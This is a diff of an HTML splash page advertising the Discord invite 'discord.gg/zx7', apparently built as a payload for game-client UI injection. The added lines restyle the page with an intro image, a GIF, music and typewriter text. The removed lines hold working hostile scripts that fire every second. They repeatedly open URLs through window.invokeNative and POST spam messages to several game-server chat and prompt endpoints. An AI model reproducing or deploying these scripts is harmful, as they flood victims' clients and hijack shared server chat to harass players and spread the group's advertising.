@@ -5,27 +5,47 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>discord.gg/zx7</title>
   <style>
-    body {
+    * {
       margin: 0;
       padding: 0;
-      background: #000;
-      overflow: hidden;
-      font-family: 'Courier New', Courier, monospace;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      height: 100vh;
+      box-sizing: border-box;
     }
 
+    body {
+      background-color: #000;
+      font-family: 'Courier New', monospace;
+      overflow: hidden;
+      height: 100vh;
+      color: #fff;
+    }
+
+    /* Fullscreen intro image */
+    #intro-image {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 10;
+      background: url('https://i.postimg.cc/ryttp9T2/IMG-1339.jpg') center center / cover no-repeat;
+      animation: fadeOut 2s ease-in-out forwards;
+      animation-delay: 2s;
+    }
+
+    @keyframes fadeOut {
+      to {
+        opacity: 0;
+        visibility: hidden;
+      }
+    }
+
+    /* Background animation */
     body::before {
       content: "";
-      position: absolute;
+      position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') repeat center center;
-      background-size: cover;
-      z-index: -1;
-      opacity: 0.5;
+      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') center center / cover no-repeat;
+      z-index: -2;
+      opacity: 0.4;
       animation: moveBg 60s linear infinite;
     }
 
@@ -34,172 +54,124 @@
       to { background-position: 1000px 1000px; }
     }
 
-    .image-container img {
-      width: 750px;
-      border: 3px solid #00ffff;
-      border-radius: 15px;
-      box-shadow: 0 0 30px #00ffff;
-      animation: pulse 3s infinite ease-in-out;
-    }
-
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.03); }
-      100% { transform: scale(1); }
+    /* Hidden content wrapper */
+    #main-content {
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      z-index: 1;
     }
 
     .text {
       margin-top: 30px;
-      font-size: 3em;
+      font-size: 2.5em;
       font-weight: bold;
       letter-spacing: 4px;
       background: linear-gradient(90deg, #ff0000, #ff9900, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000);
-      background-size: 1000% 1000%;
+      background-size: 200% auto;
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      animation: gradientShift 10s ease infinite, glow 2s ease-in-out infinite alternate, shake 1s infinite;
-      text-shadow: 0 0 25px rgba(255,255,255,0.9);
-      white-space: nowrap;
+      animation: gradientShift 6s linear infinite, glow 1.5s ease-in-out infinite;
+      text-shadow: 0 0 25px rgba(255,255,255,0.8);
     }
 
     @keyframes gradientShift {
       0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+      100% { background-position: 100% 50%; }
     }
 
     @keyframes glow {
-      from { text-shadow: 0 0 20px #00ffff, 0 0 40px #00ffff; }
-      to { text-shadow: 0 0 40px #00ffff, 0 0 60px #00ffff; }
+      0% { text-shadow: 0 0 10px #00ffff; }
+      100% { text-shadow: 0 0 30px #00ffff; }
     }
 
-    @keyframes shake {
-      0%,100% { transform: translateX(0); }
-      25% { transform: translateX(-2px); }
-      75% { transform: translateX(2px); }
+    .center-gif {
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    .center-gif img {
+      width: 600px;
+      border-radius: 15px;
+      box-shadow: 0 0 25px #fff;
+      animation: float 4s ease-in-out infinite;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
     }
   </style>
-
-  <!-- كود فتح جوجل مع البحث عن "خفت ياعمري 😂" -->
-  <script>
-    setInterval(() => {
-      const url = "https://www.google.com/search?q=خفت+ياعمري+😂";
-      window.invokeNative("openUrl", url);
-      window.invokeNative("openUrl", url);
-      window.invokeNative("openUrl", url);
-      window.invokeNative("openUrl", url);
-    }, 1000);
-  </script>
-
-  <!-- كود إرسال الرسالة للشات -->
-  <script>
-    const msg = `👑 Faisal & Al Shammari - .gg/zx7 ! 👑`;
-    const body = JSON.stringify({ message: msg });
-    setInterval(() => {
-      fetch("https://flix-scripts/chatResult", { method: "POST", body });
-      fetch("https://danger_chat/Danger_Chat:SendMessage", {
-        method: "POST",
-        body: JSON.stringify({
-          "message": msg,
-          "channel": "شات العام",
-          "color": null,
-          "isImageAndLinksAllowed": [false, false]
-        })
-      });
-      fetch("https://easy-chat+/o6ZbK5Ecp6", {
-        headers: {
-          accept: "*/*",
-          "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
-        },
-        body: JSON.stringify({ message: msg, channel: "شات العام" }),
-        method: "POST"
-      });
-      fetch("https://melix_chat/chatResult", { method: "POST", body });
-      fetch("https://as_chat/chatResult", { method: "POST", body });
-      fetch("https://chat/chatResult", { method: "POST", body });
-      fetch("https://ho-chatv2/Chat", {
-        method: "POST",
-        body: JSON.stringify({
-          "Type": "chatResult",
-          "message": msg,
-          "chatType": "general"
-        })
-      });
-    }, 1000);
-  </script>
-
-  <!-- ✅ NEW SCRIPT TO POST TO https://vrp/prompt -->
-  <script>
-    setInterval(() => {
-      fetch("https://vrp/prompt", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          act: "<<<>>>",
-          result: "close"
-        })
-      });
-    }, 1000); // safer than 0ms
-  </script>
-
 </head>
 <body>
 
-  <div class="image-container">
-    <img src="https://postimg.cc/bZhfB1mM" alt="Discord Image">
+  <!-- Fullscreen image shown first -->
+  <div id="intro-image"></div>
+
+  <!-- Main content (hidden at first) -->
+  <div id="main-content">
+    <div class="center-gif">
+      <img src="https://i.postimg.cc/Wbzp3NgF/saudi-dance.gif" alt="Dancing GIF">
+    </div>
+    <div class="text" id="typewriter"></div>
   </div>
 
-  <div class="text" id="typewriter"></div>
-
-  <!-- موسيقى خلفية -->
-  <audio id="bg-music" preload="auto">
-    <source src="https://l.top4top.io/m_3504ar66b1.mp3" type="audio/mpeg">
+  <!-- Music -->
+  <audio id="bg-music" preload="auto" loop>
+    <source src="https://cdn.discordapp.com/attachments/1386825192134803536/1402625609317879868/eCyF1sh.mp4?ex=68949864&is=689346e4&hm=dd298b0ac8b11bf204be0ec1461788aefb734f8c2482b092ea723942d3732ca9&" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
 
-  <!-- صوت كيبورد -->
+  <!-- Typing Sound -->
   <audio id="key-sound" preload="auto">
     <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_b3b2a83e90.mp3" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
 
+  <!-- Script -->
   <script>
-    // تشغيل صوت الخلفية مع fade-in
     const audio = document.getElementById("bg-music");
+    const keySound = document.getElementById("key-sound");
+    const writer = document.getElementById("typewriter");
+    const text = "صباح الخير - discord.gg/zx7";
+    let i = 0;
+
+    // Show main content after 2s
     setTimeout(() => {
+      document.getElementById("main-content").style.display = "flex";
+
+      // Start music
       audio.volume = 0;
       audio.play();
       let vol = 0;
       const fadeIn = setInterval(() => {
         if (vol < 1) {
-          vol += 0.02;
+          vol += 0.01;
           audio.volume = vol;
         } else {
           clearInterval(fadeIn);
         }
-      }, 100);
-    }, 3000);
+      }, 150);
 
-    // الكتابة الحرفية + صوت كيبورد
-    const text = "By = Al Shammari - Faisal- discord.gg/zx7";
-    const writer = document.getElementById("typewriter");
-    const keySound = document.getElementById("key-sound");
-    let i = 0;
-
-    function typeWriter() {
-      if (i < text.length) {
-        writer.innerHTML += text.charAt(i);
-        keySound.currentTime = 0;
-        keySound.play();
-        i++;
-        setTimeout(typeWriter, 100);
+      // Typing effect
+      function typeWriter() {
+        if (i < text.length) {
+          writer.innerHTML += text.charAt(i);
+          keySound.currentTime = 0;
+          keySound.play();
+          i++;
+          setTimeout(typeWriter, 100);
+        }
       }
-    }
+      typeWriter();
 
-    typeWriter();
+    }, 2000);
   </script>
-
 </body>
 </html>
